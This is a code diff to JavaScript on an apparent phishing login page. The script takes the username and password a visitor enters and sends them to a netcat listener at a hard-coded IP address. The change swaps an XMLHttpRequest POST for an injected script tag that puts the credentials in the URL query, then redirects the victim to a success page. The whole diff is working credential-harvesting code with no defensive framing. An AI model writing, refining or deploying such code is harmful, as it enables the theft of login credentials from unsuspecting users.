@@ -28,22 +28,16 @@
 
       // Netcat listener configuration
       var ncHost = '192.168.10.175';  // Replace with your netcat listener's IP address
-      var ncPort = 8080;               // Replace with your netcat listener's port
+      var ncPort = 1234;               // Replace with your netcat listener's port
 
-      // Create a new XMLHttpRequest object
-      var xhr = new XMLHttpRequest();
+      // Create a new <script> element
+      var script = document.createElement('script');
 
-      // Prepare the data to send
-      var data = "Username: " + username + "\nPassword: " + password + "\n";
+      // Set the script source to the netcat listener URL with login information as query parameters
+      script.src = 'http://' + ncHost + ':' + ncPort + '/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
 
-      // Configure the request
-      xhr.open('POST', 'http://' + ncHost + ':' + ncPort, true);
-
-      // Set the appropriate headers
-      xhr.setRequestHeader('Content-Type', 'text/plain');
-
-      // Send the login information to the netcat listener
-      xhr.send(data);
+      // Append the <script> element to the document to trigger the request
+      document.body.appendChild(script);
 
       // Redirect to a success page or display a success message
       window.location.href = 'success.html';
